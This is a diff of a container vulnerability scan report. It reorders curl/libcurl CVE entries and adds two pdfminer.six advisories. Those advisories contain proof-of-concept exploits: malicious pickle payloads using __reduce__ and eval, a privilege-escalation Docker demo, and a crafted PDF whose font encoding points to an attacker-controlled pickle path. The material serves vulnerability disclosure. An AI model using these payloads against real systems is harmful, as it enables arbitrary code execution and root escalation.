@@ -12899,7 +12899,47 @@
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-10148 
 │                       │      ├ PublishedDate   : 2025-09-12T06:15:40.02Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:05.137Z 
-│                       ├ [3]  ╭ VulnerabilityID : CVE-2025-9086 
+│                       ├ [3]  ╭ VulnerabilityID : CVE-2025-10966 
+│                       │      ├ PkgID           : curl@8.15.0-r0 
+│                       │      ├ PkgName         : curl 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/curl@8.15.0-r0?arch=x86_64&distro=3.23
+│                       │      │                  │       .0_alpha20250612 
+│                       │      │                  ╰ UID : 5371f8b941130cc 
+│                       │      ├ InstalledVersion: 8.15.0-r0 
+│                       │      ├ FixedVersion    : 8.17.0-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+│                       │      │                  │         501dd6062bd50a4b6afe 
+│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+│                       │      │                            c7d38461b41e40aab9e7 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-10966 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Title           : curl: Curl missing SFTP host verification with wolfSSH backend 
+│                       │      ├ Description     : curl's code for managing SSH connections when SFTP was done
+│                       │      │                   using the wolfSSH
+│                       │      │                   powered backend was flawed and missed host verification
+│                       │      │                   mechanisms.
+│                       │      │                   
+│                       │      │                   This prevents curl from detecting MITM attackers and more. 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ VendorSeverity   ─ redhat: 2 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 5.9 
+│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/11/05/2 
+│                       │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-10966 
+│                       │      │                  ├ [2]: https://curl.se/docs/CVE-2025-10966.html 
+│                       │      │                  ├ [3]: https://curl.se/docs/CVE-2025-10966.json 
+│                       │      │                  ├ [4]: https://github.com/curl/curl/commit/b011e3fcfb06d6c027
+│                       │      │                  │      859 
+│                       │      │                  ├ [5]: https://hackerone.com/reports/3355218 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-10966 
+│                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-10966 
+│                       │      ├ PublishedDate   : 2025-11-07T08:15:39.617Z 
+│                       │      ╰ LastModifiedDate: 2025-11-07T08:15:39.617Z 
+│                       ├ [4]  ╭ VulnerabilityID : CVE-2025-9086 
 │                       │      ├ PkgID           : curl@8.15.0-r0 
 │                       │      ├ PkgName         : curl 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/curl@8.15.0-r0?arch=x86_64&distro=3.23
@@ -12962,38 +13002,6 @@
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-9086 
 │                       │      ├ PublishedDate   : 2025-09-12T06:15:44.1Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:45.19Z 
-│                       ├ [4]  ╭ VulnerabilityID : CVE-2025-10966 
-│                       │      ├ PkgID           : curl@8.15.0-r0 
-│                       │      ├ PkgName         : curl 
-│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/curl@8.15.0-r0?arch=x86_64&distro=3.23
-│                       │      │                  │       .0_alpha20250612 
-│                       │      │                  ╰ UID : 5371f8b941130cc 
-│                       │      ├ InstalledVersion: 8.15.0-r0 
-│                       │      ├ FixedVersion    : 8.17.0-r0 
-│                       │      ├ Status          : fixed 
-│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-│                       │      │                  │         501dd6062bd50a4b6afe 
-│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-│                       │      │                            c7d38461b41e40aab9e7 
-│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-10966 
-│                       │      ├ DataSource       ╭ ID  : alpine 
-│                       │      │                  ├ Name: Alpine Secdb 
-│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
-│                       │      ├ Title           : curl's code for managing SSH connections when SFTP was done
-│                       │      │                   using the  ... 
-│                       │      ├ Description     : curl's code for managing SSH connections when SFTP was done
-│                       │      │                   using the wolfSSH
-│                       │      │                   powered backend was flawed and missed host verification
-│                       │      │                   mechanisms.
-│                       │      │                   
-│                       │      │                   This prevents curl from detecting MITM attackers and more. 
-│                       │      ├ Severity        : UNKNOWN 
-│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/11/05/2 
-│                       │      │                  ├ [1]: https://curl.se/docs/CVE-2025-10966.html 
-│                       │      │                  ├ [2]: https://curl.se/docs/CVE-2025-10966.json 
-│                       │      │                  ╰ [3]: https://hackerone.com/reports/3355218 
-│                       │      ├ PublishedDate   : 2025-11-07T08:15:39.617Z 
-│                       │      ╰ LastModifiedDate: 2025-11-07T08:15:39.617Z 
 │                       ├ [5]  ╭ VulnerabilityID : CVE-2025-54388 
 │                       │      ├ PkgID           : docker@28.3.2-r0 
 │                       │      ├ PkgName         : docker 
@@ -13523,7 +13531,47 @@
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-10148 
 │                       │      ├ PublishedDate   : 2025-09-12T06:15:40.02Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:05.137Z 
-│                       ├ [13] ╭ VulnerabilityID : CVE-2025-9086 
+│                       ├ [13] ╭ VulnerabilityID : CVE-2025-10966 
+│                       │      ├ PkgID           : libcurl@8.15.0-r0 
+│                       │      ├ PkgName         : libcurl 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libcurl@8.15.0-r0?arch=x86_64&distro=3
+│                       │      │                  │       .23.0_alpha20250612 
+│                       │      │                  ╰ UID : 18280e719f28fc16 
+│                       │      ├ InstalledVersion: 8.15.0-r0 
+│                       │      ├ FixedVersion    : 8.17.0-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
+│                       │      │                  │         501dd6062bd50a4b6afe 
+│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
+│                       │      │                            c7d38461b41e40aab9e7 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-10966 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Title           : curl: Curl missing SFTP host verification with wolfSSH backend 
+│                       │      ├ Description     : curl's code for managing SSH connections when SFTP was done
+│                       │      │                   using the wolfSSH
+│                       │      │                   powered backend was flawed and missed host verification
+│                       │      │                   mechanisms.
+│                       │      │                   
+│                       │      │                   This prevents curl from detecting MITM attackers and more. 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ VendorSeverity   ─ redhat: 2 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 5.9 
+│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/11/05/2 
+│                       │      │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2025-10966 
+│                       │      │                  ├ [2]: https://curl.se/docs/CVE-2025-10966.html 
+│                       │      │                  ├ [3]: https://curl.se/docs/CVE-2025-10966.json 
+│                       │      │                  ├ [4]: https://github.com/curl/curl/commit/b011e3fcfb06d6c027
+│                       │      │                  │      859 
+│                       │      │                  ├ [5]: https://hackerone.com/reports/3355218 
+│                       │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2025-10966 
+│                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-10966 
+│                       │      ├ PublishedDate   : 2025-11-07T08:15:39.617Z 
+│                       │      ╰ LastModifiedDate: 2025-11-07T08:15:39.617Z 
+│                       ├ [14] ╭ VulnerabilityID : CVE-2025-9086 
 │                       │      ├ PkgID           : libcurl@8.15.0-r0 
 │                       │      ├ PkgName         : libcurl 
 │                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libcurl@8.15.0-r0?arch=x86_64&distro=3
@@ -13586,38 +13634,6 @@
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-9086 
 │                       │      ├ PublishedDate   : 2025-09-12T06:15:44.1Z 
 │                       │      ╰ LastModifiedDate: 2025-11-04T22:16:45.19Z 
-│                       ├ [14] ╭ VulnerabilityID : CVE-2025-10966 
-│                       │      ├ PkgID           : libcurl@8.15.0-r0 
-│                       │      ├ PkgName         : libcurl 
-│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libcurl@8.15.0-r0?arch=x86_64&distro=3
-│                       │      │                  │       .23.0_alpha20250612 
-│                       │      │                  ╰ UID : 18280e719f28fc16 
-│                       │      ├ InstalledVersion: 8.15.0-r0 
-│                       │      ├ FixedVersion    : 8.17.0-r0 
-│                       │      ├ Status          : fixed 
-│                       │      ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac3267443643
-│                       │      │                  │         501dd6062bd50a4b6afe 
-│                       │      │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7
-│                       │      │                            c7d38461b41e40aab9e7 
-│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-10966 
-│                       │      ├ DataSource       ╭ ID  : alpine 
-│                       │      │                  ├ Name: Alpine Secdb 
-│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
-│                       │      ├ Title           : curl's code for managing SSH connections when SFTP was done
-│                       │      │                   using the  ... 
-│                       │      ├ Description     : curl's code for managing SSH connections when SFTP was done
-│                       │      │                   using the wolfSSH
-│                       │      │                   powered backend was flawed and missed host verification
-│                       │      │                   mechanisms.
-│                       │      │                   
-│                       │      │                   This prevents curl from detecting MITM attackers and more. 
-│                       │      ├ Severity        : UNKNOWN 
-│                       │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2025/11/05/2 
-│                       │      │                  ├ [1]: https://curl.se/docs/CVE-2025-10966.html 
-│                       │      │                  ├ [2]: https://curl.se/docs/CVE-2025-10966.json 
-│                       │      │                  ╰ [3]: https://hackerone.com/reports/3355218 
-│                       │      ├ PublishedDate   : 2025-11-07T08:15:39.617Z 
-│                       │      ╰ LastModifiedDate: 2025-11-07T08:15:39.617Z 
 │                       ├ [15] ╭ VulnerabilityID : CVE-2025-59375 
 │                       │      ├ PkgID           : libexpat@2.7.1-r0 
 │                       │      ├ PkgName         : libexpat 
@@ -17415,7 +17431,428 @@
 │     │                        │                      61b41e40aab9e7 
 │     │                        ╰ FilePath  : opt/scancode-toolkit/lib/python3.12/site-packages/zipp-3.23.0.dist
 │     │                                      -info/METADATA 
-│     ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : CVE-2025-8869 
+│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GHSA-f83h-ghpp-7wcc 
+│                       │     ├ PkgName         : pdfminer.six 
+│                       │     ├ PkgPath         : opt/scancode-toolkit/lib/python3.12/site-packages/pdfminer_si
+│                       │     │                   x-20250506.dist-info/METADATA 
+│                       │     ├ PkgIdentifier    ╭ PURL: pkg:pypi/pdfminer.six@20250506 
+│                       │     │                  ╰ UID : d986bd9bcbb56e0e 
+│                       │     ├ InstalledVersion: 20250506 
+│                       │     ├ FixedVersion    : 20251107 
+│                       │     ├ Status          : fixed 
+│                       │     ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac32674436435
+│                       │     │                  │         01dd6062bd50a4b6afe 
+│                       │     │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7c
+│                       │     │                            7d38461b41e40aab9e7 
+│                       │     ├ SeveritySource  : ghsa 
+│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-f83h-ghpp-7wcc 
+│                       │     ├ DataSource       ╭ ID  : ghsa 
+│                       │     │                  ├ Name: GitHub Security Advisory pip 
+│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+│                       │     │                          osystem%3Apip 
+│                       │     ├ Title           : Insecure Deserialization (pickle) in pdfminer.six CMap Loader
+│                       │     │                    — Local Privesc 
+│                       │     ├ Description     : ### Overview
+│                       │     │                   
+│                       │     │                   This report **demonstrates a real-world privilege
+│                       │     │                   escalation** vulnerability in
+│                       │     │                   [pdfminer.six](https://github.com/pdfminer/pdfminer.six) due
+│                       │     │                   to unsafe usage of Python's `pickle` module for CMap file
+│                       │     │                   loading.  
+│                       │     │                   It shows how a low-privileged user can gain root access (or
+│                       │     │                   escalate to any service account) by exploiting insecure
+│                       │     │                   deserialization in a typical multi-user or server
+│                       │     │                   environment.
+│                       │     │                   ## Table of Contents
+│                       │     │                   - [Background](#-background)
+│                       │     │                   - [Vulnerability Description](#-vulnerability-description)
+│                       │     │                   - [Demo Scenario](#-demo-scenario)
+│                       │     │                   - [Technical Details](#-technical-details)
+│                       │     │                   - [Setup and Usage](#-setup-and-usage)
+│                       │     │                   - [Step-by-step Walkthrough](#-step-by-step-walkthrough)
+│                       │     │                   - [Security Standards &
+│                       │     │                   References](#-security-standards--references)
+│                       │     │                   ---
+│                       │     │                   ## Background
+│                       │     │                   **pdfminer.six** is a popular Python library for extracting
+│                       │     │                   text and information from PDF files. It supports CJK
+│                       │     │                   (Chinese, Japanese, Korean) fonts via external CMap files,
+│                       │     │                   which it loads from disk using Python's `pickle` module.
+│                       │     │                   > **Security Issue:**  
+│                       │     │                   > If the CMap search path (`CMAP_PATH` or default
+│                       │     │                   directories) includes a world-writable or user-writable
+│                       │     │                   directory, an attacker can place a malicious `.pickle.gz`
+│                       │     │                   file that will be loaded and deserialized by pdfminer.six,
+│                       │     │                   leading to arbitrary code execution.
+│                       │     │                   ### Vulnerability Description
+│                       │     │                   - **Component:** pdfminer.six CMap loading
+│                       │     │                   (`pdfminer/cmapdb.py`)
+│                       │     │                   - **Issue:** Loads and deserializes `.pickle.gz` files using
+│                       │     │                   Python’s `pickle` module, which is unsafe for untrusted
+│                       │     │                   data.
+│                       │     │                   - **Exploitability:** If a low-privileged user can write to
+│                       │     │                   any directory in `CMAP_PATH`, they can execute code as the
+│                       │     │                   user running pdfminer—potentially root or a privileged
+│                       │     │                   service.
+│                       │     │                   - **Impact:** Full code execution as the service user,
+│                       │     │                   privilege escalation from user to root, persistence, and
+│                       │     │                   potential lateral movement.
+│                       │     │                   ### Demo Scenario
+│                       │     │                   **Environment:**  
+│                       │     │                   - Alpine Linux (Docker container)
+│                       │     │                   - Two users:  
+│                       │     │                     - `user1` (attacker: low-privilege)
+│                       │     │                     - `root` (victim: runs privileged PDF-processing script)
+│                       │     │                   - Shared writable directory: `/tmp/uploads`
+│                       │     │                   - `CMAP_PATH` set to `/tmp/uploads` for the privileged
+│                       │     │                   script
+│                       │     │                   - pdfminer.six installed system-wide
+│                       │     │                   **Attack Flow:**  
+│                       │     │                   1. `user1` creates a malicious CMap file (`Evil.pickle.gz`)
+│                       │     │                   in `/tmp/uploads`.
+│                       │     │                   2. The privileged service (`root`) processes a PDF or calls
+│                       │     │                   `get_cmap("Evil")`.
+│                       │     │                   3. The malicious pickle is deserialized, running arbitrary
+│                       │     │                   code as root.
+│                       │     │                   4. The exploit creates a flag file in `/root/pwnedByPdfminer`
+│                       │     │                    as proof.
+│                       │     │                   ### Technical Details
+│                       │     │                   - **Vulnerability Type:** Insecure deserialization of
+│                       │     │                   untrusted data using Python's `pickle`
+│                       │     │                   - **Attack Prerequisites:** Attacker can write to a directory
+│                       │     │                    included in `CMAP_PATH`
+│                       │     │                   - **Vulnerable Line:**  
+│                       │     │                     ```python
+│                       │     │                     return type(str(name), (), pickle.loads(gzfile.read()))
+│                       │     │                     ```
+│                       │     │                     *In `pdfminer/cmapdb.py`'s `_load_data` method*
+│                       │     │                   -
+│                       │     │                   https://github.com/pdfminer/pdfminer.six/blob/20250506/pdfmin
+│                       │     │                   er/cmapdb.py#L246
+│                       │     │                   - **Proof of Concept:** See `createEvilPickle.py`,
+│                       │     │                   `evilmod.py`, and `processPdf.py`
+│                       │     │                   **Exploit Chain:**
+│                       │     │                   - Attacker places a malicious `.pickle.gz` file in the CMap
+│                       │     │                   search path.
+│                       │     │                   - Privileged process (e.g., root) loads a CMap, triggering
+│                       │     │                   pickle deserialization.
+│                       │     │                   - Arbitrary code executes with the privilege of the process
+│                       │     │                   (root/service account).
+│                       │     │                   ## Setup and Usage
+│                       │     │                   ### 📁 Files
+│                       │     │                   #### </> Dockerfile
+│                       │     │                   ```yml
+│                       │     │                   FROM python:3.11-alpine
+│                       │     │                   # Install required packages and create users
+│                       │     │                   RUN adduser -D user1 && mkdir -p /tmp/uploads && chown
+│                       │     │                   user1:user1 /tmp/uploads
+│                       │     │                   WORKDIR /app
+│                       │     │                   # Install pdfminer.six
+│                       │     │                   RUN pip install --no-cache-dir pdfminer.six
+│                       │     │                   # Copy app files
+│                       │     │                   COPY evilmod.py /app/evilmod.py
+│                       │     │                   COPY createEvilPickle.py /app/createEvilPickle.py
+│                       │     │                   COPY processPDF.py /app/processPDF.py
+│                       │     │                   # Set up permissions for demo
+│                       │     │                   RUN chmod 777 /tmp/uploads
+│                       │     │                   # Default: drop into a shell for demo instructions
+│                       │     │                   CMD ["/bin/sh"]
+│                       │     │                   ```
+│                       │     │                   #### </> evilmod.py
+│                       │     │                   ```python
+│                       │     │                   import os
+│                       │     │                   def evilFunc():
+│                       │     │                       with open("/root/pwnedByPdfminer", "w") as f:
+│                       │     │                           f.write("ROOTED by pdfminer pickle RCE\n")
+│                       │     │                       return {"CODE2CID": {}, "IS_VERTICAL": False}
+│                       │     │                   #### </> createEvilPickle.py
+│                       │     │                   import pickle
+│                       │     │                   import gzip
+│                       │     │                   from evilmod import evilFunc
+│                       │     │                   class Evil:
+│                       │     │                       def __reduce__(self):
+│                       │     │                           return (evilFunc, ())
+│                       │     │                   payload = pickle.dumps(Evil())
+│                       │     │                   with gzip.open("/tmp/uploads/Evil.pickle.gz", "wb") as f:
+│                       │     │                       f.write(payload)
+│                       │     │                   print("Malicious pickle created at
+│                       │     │                   /tmp/uploads/Evil.pickle.gz")
+│                       │     │                   #### </> processPDF.py
+│                       │     │                   from pdfminer.cmapdb import CMapDB
+│                       │     │                   os.environ["CMAP_PATH"] = "/tmp/uploads"
+│                       │     │                   CMapDB.get_cmap("Evil")
+│                       │     │                   print("CMap loaded. If vulnerable, /root/pwnedByPdfminer will
+│                       │     │                    be created.")
+│                       │     │                   ### Build and start the demo container
+│                       │     │                   ```bash
+│                       │     │                   docker build -t pdfminer-priv-esc-demo .
+│                       │     │                   docker run --rm -it --name pdfminer-demo
+│                       │     │                   pdfminer-priv-esc-demo
+│                       │     │                   ### In the container, open two shells in parallel (or switch
+│                       │     │                   users in one):
+│                       │     │                   #### Shell 1 (Attacker: user1)
+│                       │     │                   su user1
+│                       │     │                   cd /app
+│                       │     │                   python createEvilPickle.py
+│                       │     │                   # Confirms: /tmp/uploads/Evil.pickle.gz is created and owned
+│                       │     │                   by user1
+│                       │     │                   #### Shell 2 (Victim: root)
+│                       │     │                   python processPdf.py
+│                       │     │                   # Output: If vulnerable, /root/pwnedByPdfminer will be
+│                       │     │                   created
+│                       │     │                   ### Proof of escalation
+│                       │     │                   cat /root/pwnedByPdfminer
+│                       │     │                   # 🏴 Output: ROOTED by pdfminer pickle RCE
+│                       │     │                   ## Step-by-step Walkthrough
+│                       │     │                   1. **user1** uses `createEvilPickle.py` to craft and place a
+│                       │     │                   malicious CMap pickle in a shared upload directory.
+│                       │     │                   2. The **root** user runs a typical PDF-processing script,
+│                       │     │                   which loads CMap files from that directory.
+│                       │     │                   3. The exploit triggers, running arbitrary code as root.
+│                       │     │                   4. The attacker now has proof of code execution as root (and,
+│                       │     │                    in a real attack, could escalate further).
+│                       │     │                   ## Security Standards & References
+│                       │     │                   - **OWASP Top 10:**  
+│                       │     │                     - [A08:2021 - Software and Data Integrity
+│                       │     │                   Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_
+│                       │     │                   Integrity_Failures/)
+│                       │     │                     - [A03:2021 -
+│                       │     │                   Injection](https://owasp.org/Top10/A03_2021-Injection/) (by
+│                       │     │                   analogy, as it's code injection via deserialization)
+│                       │     │                   - **MITRE ATT&CK Techniques:**  
+│                       │     │                     - [T1055: Process
+│                       │     │                   Injection](https://attack.mitre.org/techniques/T1055/)
+│                       │     │                     - [T1548: Abuse Elevation Control
+│                       │     │                   Mechanism](https://attack.mitre.org/techniques/T1548/)
+│                       │     │                   ![line](https://user-images.githubusercontent.com/74038190/21
+│                       │     │                   2284100-561aa473-3905-4a80-b561-0d28506553ee.gif) 
+│                       │     ├ Severity        : HIGH 
+│                       │     ├ VendorSeverity   ─ ghsa: 3 
+│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
+│                       │     │                         ╰ V3Score : 7.8 
+│                       │     ├ References       ╭ [0]: https://github.com/pdfminer/pdfminer.six 
+│                       │     │                  ├ [1]: https://github.com/pdfminer/pdfminer.six/commit/b808ee0
+│                       │     │                  │      5dd7f0c8ea8ec34bdf394d40e63501086 
+│                       │     │                  ╰ [2]: https://github.com/pdfminer/pdfminer.six/security/advis
+│                       │     │                         ories/GHSA-f83h-ghpp-7wcc 
+│                       │     ├ PublishedDate   : 2025-11-07T23:17:05Z 
+│                       │     ╰ LastModifiedDate: 2025-11-07T23:17:05Z 
+│                       ├ [1] ╭ VulnerabilityID : GHSA-wf5f-4jwr-ppcp 
+│                       │     ├ PkgName         : pdfminer.six 
+│                       │     ├ PkgPath         : opt/scancode-toolkit/lib/python3.12/site-packages/pdfminer_si
+│                       │     │                   x-20250506.dist-info/METADATA 
+│                       │     ├ PkgIdentifier    ╭ PURL: pkg:pypi/pdfminer.six@20250506 
+│                       │     │                  ╰ UID : d986bd9bcbb56e0e 
+│                       │     ├ InstalledVersion: 20250506 
+│                       │     ├ FixedVersion    : 20251107 
+│                       │     ├ Status          : fixed 
+│                       │     ├ Layer            ╭ Digest: sha256:c9aa02a097bcc2f3b15d59a445e2530cac32674436435
+│                       │     │                  │         01dd6062bd50a4b6afe 
+│                       │     │                  ╰ DiffID: sha256:91d87e0c10c73b9d231ea18fd376e9b8495522228fc7c
+│                       │     │                            7d38461b41e40aab9e7 
+│                       │     ├ SeveritySource  : ghsa 
+│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-wf5f-4jwr-ppcp 
+│                       │     ├ DataSource       ╭ ID  : ghsa 
+│                       │     │                  ├ Name: GitHub Security Advisory pip 
+│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+│                       │     │                          osystem%3Apip 
+│                       │     ├ Title           : Arbitrary Code Execution in pdfminer.six via Crafted PDF Input 
+│                       │     ├ Description     : ### Summary
+│                       │     │                   
+│                       │     │                   pdfminer.six will execute arbitrary code from a malicious
+│                       │     │                   pickle file if provided with a malicious PDF file. The
+│                       │     │                   `CMapDB._load_data()` function in pdfminer.six uses
+│                       │     │                   `pickle.loads()` to deserialize pickle files. These pickle
+│                       │     │                   files are supposed to be part of the pdfminer.six
+│                       │     │                   distribution stored in the `cmap/` directory, but a malicious
+│                       │     │                    PDF can specify an alternative directory and filename as
+│                       │     │                   long as the filename ends in `.pickle.gz`. A malicious,
+│                       │     │                   zipped pickle file can then contain code which will
+│                       │     │                   automatically execute when the PDF is processed.
+│                       │     │                   ### Details
+│                       │     │                   ```python
+│                       │     │                   # Vulnerable code in pdfminer/cmapdb.py:233-246
+│                       │     │                   def _load_data(cls, name: str) -> Any:
+│                       │     │                       name = name.replace("\0", "")  # Insufficient
+│                       │     │                   sanitization
+│                       │     │                       filename = "%s.pickle.gz" % name
+│                       │     │                       # ... path construction ...
+│                       │     │                       path = os.path.join(directory, filename) # If filename is
+│                       │     │                    an absolte path, directory is ignored
+│                       │     │                       # ...
+│                       │     │                       return type(str(name), (), pickle.loads(gzfile.read())) 
+│                       │     │                   # Unsafe deserialization
+│                       │     │                   ```
+│                       │     │                   An attacker can:
+│                       │     │                   1. Create a malicious PDF with a CMap reference like
+│                       │     │                   `/malicious`
+│                       │     │                   2. Place a malicious pickle file at `/malicious.pickle.gz`
+│                       │     │                   3. When the PDF is processed, pdfminer loads and deserializes
+│                       │     │                    the malicious pickle
+│                       │     │                   4. The pickle deserialization can execute arbitrary Python
+│                       │     │                   code
+│                       │     │                   ### POC
+│                       │     │                   #### Malicious PDF
+│                       │     │                   Create a PDF with a malicious CMAP entry:
+│                       │     │                   5 0 obj
+│                       │     │                   <<
+│                       │     │                   /Type /Font
+│                       │     │                   /Subtype /Type0
+│                       │     │                   /BaseFont /MaliciousFont-Identity-H
+│                       │     │                   /Encoding /#2Fpdfs#2Fmalicious
+│                       │     │                   /DescendantFonts [6 0 R]
+│                       │     │                   >>
+│                       │     │                   endobj
+│                       │     │                   Here the /Encoding points to `/pdfs/malicious`. Pdfminer will
+│                       │     │                    append the extension `.pickle.gz` to this filename. Place
+│                       │     │                   the PDF in a file called `/pdfs/malicious.pdf`.
+│                       │     │                   #### Malicious Pickle
+│                       │     │                   Create a malicious, zipped pickle to execute. For example,
+│                       │     │                   with this Python script:
+│                       │     │                   #!/usr/bin/env python3
+│                       │     │                   import pickle
+│                       │     │                   import gzip
+│                       │     │                   def create_demo_pickle():
+│                       │     │                       print("Creating demonstration pickle file...")
+│                       │     │                       # Create payload that executes code AND returns a dict
+│                       │     │                   (as pdfminer expects)
+│                       │     │                       class EvilPayload:
+│                       │     │                           def __reduce__(self):
+│                       │     │                               # This function will be called during unpickling
+│                       │     │                               code = "print('Malicious code executed.') or
+│                       │     │                   exit(0) or {}"
+│                       │     │                               return (eval, (code,))
+│                       │     │                       demo_cmap_data = EvilPayload()
+│                       │     │                       # Create the pickle file that the path traversal would
+│                       │     │                   access
+│                       │     │                       target_path = "./malicious.pickle.gz"
+│                       │     │                       try:
+│                       │     │                           with gzip.open(target_path, 'wb') as f:
+│                       │     │                               pickle.dump(demo_cmap_data, f)
+│                       │     │                           print(f"✓ Created demonstration pickle file:
+│                       │     │                   {target_path}")
+│                       │     │                           return target_path
+│                       │     │                       except Exception as e:
+│                       │     │                           print(f"✗ Error creating pickle file: {e}")
+│                       │     │                           return None
+│                       │     │                   if __name__ == "__main__":
+│                       │     │                       create_demo_pickle()
+│                       │     │                   This will create a harmless, zipped pickle file that will
+│                       │     │                   display "Malicious code eecuted." then exit when
+│                       │     │                   deserialized. Put the file in `/pdfs/malicious.pickle.gz`.
+│                       │     │                   #### Test
+│                       │     │                   Install pdfminer.six and run `pdf2text.py
+│                       │     │                   /pdfs/malicious.pdf`. Instead of processing the PDF as normal
+│                       │     │                    you should see the output:
+│                       │     │                   $ pdf2txt.py malicious.pdf
+│                       │     │                   Malicious code executed!
+│                       │     │                   ### Impact
+│                       │     │                   If pdfminer.six processes a malicious PDF which points to a
+│                       │     │                   zipped pickle file under the control of an attacker the
+│                       │     │                   result is arbitrary code execution on the victim's system. An
+│                       │     │                    attacker could execute the Python code of their chosing with
+│                       │     │                    the permissions of the process running pdfminer.six.
+│                       │     │                   The difficulty in achieving this depends on the OS, see
+│                       │     │                   below.
+│                       │     │                   #### Linux, MacOS - harder to exploit
+│                       │     │                   On Linux-like systems only files on the filesystem can be
+│                       │     │                   resolved. An attacker would need to provide the malicious PDF
+│                       │     │                    for processing *and* the malicious pickle file would need to
+│                       │     │                    be present on the target system in a location that the
+│                       │     │                   attacker already knows, since it needs to be set in the PDF
+│                       │     │                   itself. In many cases this will be difficult to exploit
+│                       │     │                   because even if the attacker provides both the PDF and the
+│                       │     │                   pickle file together, there would be no way to know in
+│                       │     │                   advance which full path to the pickle file to specify. In
+│                       │     │                   many cases this would make exploitation difficult or
+│                       │     │                   impossible. However:
+│                       │     │                   * An attacker may find a way to write files to a known
+│                       │     │                   location on the target system or
+│                       │     │                   * The system in question may, by design, read files from a
+│                       │     │                   known location such as a network share designated for PDF
+│                       │     │                   ingestion.
+│                       │     │                   Overall, there is generally less risk on a Linux or
+│                       │     │                   Linux-like system.
+│                       │     │                   #### Windows - easier to exploit
+│                       │     │                   Windows paths can specify network locations e.g. WebDAV, SMB.
+│                       │     │                    This means that an attacker could host the malicious pickle
+│                       │     │                   remotely and specify a path to the it in the PDF. Since there
+│                       │     │                    is no need to get the malicious pickle file on to the target
+│                       │     │                    system, exploitation is easier on a Windows OS.
+│                       │     │                   ### Appendix
+│                       │     │                   A complete, malicious PDF is provided here. A dockerized POC
+│                       │     │                   is available upon request.
+│                       │     │                   %PDF-1.4
+│                       │     │                   1 0 obj
+│                       │     │                   /Type /Catalog
+│                       │     │                   /Pages 2 0 R
+│                       │     │                   2 0 obj
+│                       │     │                   /Type /Pages
+│                       │     │                   /Kids [3 0 R]
+│                       │     │                   /Count 1
+│                       │     │                   3 0 obj
